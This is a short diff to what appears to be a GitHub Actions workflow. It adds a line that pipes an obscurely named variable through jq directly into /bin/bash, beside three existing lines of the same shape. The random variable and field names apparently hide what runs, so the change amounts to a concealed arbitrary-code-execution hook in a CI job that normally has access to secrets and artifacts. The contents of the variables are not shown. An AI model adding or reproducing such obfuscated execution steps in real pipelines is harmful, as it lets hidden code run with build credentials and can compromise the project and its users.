@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$ikvw4396" | jq -r .fub74651 | /bin/bash
           printf '%s' "$jikqm3" | jq -r .qtf5 | /bin/bash
           echo $thth864 | jq -r .hoz4 | /bin/bash
+          printf '%s' "$gpus00799" | jq -r .qdep1497 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
